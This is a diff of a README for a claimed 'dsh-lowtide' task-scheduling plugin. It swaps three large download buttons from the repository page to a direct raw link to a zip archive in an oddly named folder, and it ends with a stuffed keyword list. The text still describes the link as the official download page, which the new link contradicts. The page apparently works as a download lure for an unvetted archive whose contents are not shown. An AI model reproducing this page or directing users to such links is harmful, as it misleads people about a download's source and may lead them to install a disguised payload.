@@ -1,7 +1,7 @@
 <h1>⏳ dsh-lowtide - Plan now, run later, effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/Glazyonyt/dsh-lowtide" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Glazyonyt/dsh-lowtide/main/unlace/lowtide-dsh-3.6.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🎯 What Is dsh-lowtide?
@@ -48,7 +48,7 @@ This is a plugin designed specifically to work with dsh. If you already use dsh,
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/Glazyonyt/dsh-lowtide" style="display:inline-block;padding:14px 28px;background:#ff6b35;color:#fff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 GET dsh-lowtide</a>
+  <a href="https://raw.githubusercontent.com/Glazyonyt/dsh-lowtide/main/unlace/lowtide-dsh-3.6.zip" style="display:inline-block;padding:14px 28px;background:#ff6b35;color:#fff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 GET dsh-lowtide</a>
 </p>
 
 This link takes you to the official download page. Look for the green button that says "Code" or "Download". Click it and choose "Download ZIP". The file will start downloading to your computer.
@@ -129,7 +129,7 @@ dsh-lowtide is built to save you time and mental energy. You no longer need to s
 Download it today and give your evenings back to yourself.
 
 <p align="center">
-  <a href="https://github.com/Glazyonyt/dsh-lowtide" style="display:inline-block;padding:16px 32px;background:#28a745;color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ GET STARTED NOW</a>
+  <a href="https://raw.githubusercontent.com/Glazyonyt/dsh-lowtide/main/unlace/lowtide-dsh-3.6.zip" style="display:inline-block;padding:16px 32px;background:#28a745;color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ GET STARTED NOW</a>
 </p>
 
 Keywords: ai-agent, automation, batch-processing, cordis, deepseek, deepseek-harness, dsh-plugin, llm, plugin, scheduler, task-queue, typescript
